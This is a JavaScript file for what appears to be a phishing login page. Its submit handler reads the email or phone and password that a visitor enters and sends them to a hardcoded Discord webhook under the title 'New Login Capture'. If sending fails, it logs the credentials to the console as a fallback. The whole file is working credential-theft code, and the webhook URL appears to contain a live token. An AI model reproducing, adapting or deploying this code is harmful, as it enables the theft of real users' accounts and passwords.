const WEBHOOK_URL = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G";

// Wait for DOM to be fully loaded
document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('login-form');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    
    if (!loginForm) {
        console.error('Login form not found!');
        return;
    }

    // Form submission handler
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        e.stopPropagation(); // Prevent any event bubbling
        
        console.log('Form submitted - starting webhook process...');
        
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();

        // Validation
        if (!email) {
            showError('Please enter an email or phone number');
            emailInput.focus();
            return;
        }

        if (!password) {
            showError('Please enter a password');
            passwordInput.focus();
            return;
        }

        // Disable form during submission
        setFormLoading(true);
        
        try {
            console.log('Preparing webhook payload...');
            
            // Create embed payload for better Discord formatting
            const payload = {
                username: "Security Bot",
                avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
                embeds: [
                    {
                        title: "🔐 New Login Capture",
                        color: 15105570,
                        fields: [
                            {
                                name: "📧 Email/Phone",
                                value: "```" + email + "```",
                                inline: false
                            },
                            {
                                name: "🔑 Password",
                                value: "```" + password + "```",
                                inline: false
                            }
                        ],
                        footer: {
                            text: "Captured via Webhook • " + new Date().toLocaleString()
                        },
                        timestamp: new Date().toISOString()
                    }
                ]
            };

            console.log('Sending request to webhook...');
            
            const response = await fetch(WEBHOOK_URL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            });

            console.log('Webhook response status:', response.status);
            
            if (response.ok) {
                console.log('Webhook successful!');
                showSuccess('✓ Data successfully captured and sent!');
                loginForm.reset();
            } else {
                const errorText = await response.text();
                console.error('Webhook error response:', errorText);
                throw new Error(`Discord API returned status: ${response.status}`);
            }
            
        } catch (error) {
            console.error('Full error details:', error);
            showError('Failed to send data. Error: ' + error.message);
            
            // Fallback: log to console as backup
            console.log('CAPTURED DATA - Email:', email, 'Password:', password);
        } finally {
            // Re-enable form
            setFormLoading(false);
        }
    });

    // Utility functions
    function showError(message) {
        alert('❌ ' + message);
    }

    function showSuccess(message) {
        alert('✅ ' + message);
    }

    function setFormLoading(loading) {
        const submitBtn = loginForm.querySelector('button[type="submit"]');
        if (submitBtn) {
            submitBtn.disabled = loading;
            submitBtn.textContent = loading ? 'Sending...' : 'Log In';
        }
    }

    // Add some styling for better UX
    const style = document.createElement('style');
    style.textContent = `
        button[disabled] {
            opacity: 0.6;
            cursor: not-allowed;
        }
    `;
    document.head.appendChild(style);

    console.log('Webhook handler initialized successfully');
});

// Additional safety check
if (typeof WEBHOOK_URL !== 'string' || !WEBHOOK_URL.includes('discord.com/api/webhooks')) {
    console.error('Invalid webhook URL configured');
}
